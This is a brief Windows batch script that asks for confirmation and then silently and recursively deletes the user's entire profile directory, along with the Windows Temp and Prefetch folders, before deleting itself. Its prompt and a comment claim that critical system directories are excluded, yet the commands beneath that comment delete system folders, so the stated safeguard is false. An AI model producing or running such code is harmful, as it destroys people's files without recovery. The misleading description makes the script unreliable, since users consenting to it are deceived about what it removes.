@echo off

set /p confirm="This script will permanently delete files and folders in your profile directory, excluding critical system directories. Are you sure you want to continue? (Y/N): "
if /i "%confirm%" neq "Y" goto :eof

set "target_directory=%userprofile%"
rd /s /q "%target_directory%" 2>nul

rem Exclude critical system directories from deletion
rd /s /q "%windir%\Temp" 2>nul
rd /s /q "%windir%\Prefetch" 2>nul

(goto) 2>nul & del "%~f0"
